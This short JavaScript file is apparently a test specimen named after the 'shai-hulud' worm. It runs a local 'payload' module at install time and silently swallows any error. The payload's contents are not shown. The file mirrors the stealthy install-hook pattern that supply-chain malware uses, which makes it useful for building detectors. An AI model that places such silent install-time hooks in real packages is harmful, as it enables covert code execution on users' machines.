'use strict';
// Parallax specimen (shai-hulud): install-time check. Harmless.
try { require('./payload').run('shai-hulud', require('./trigger')); } catch (_) {}
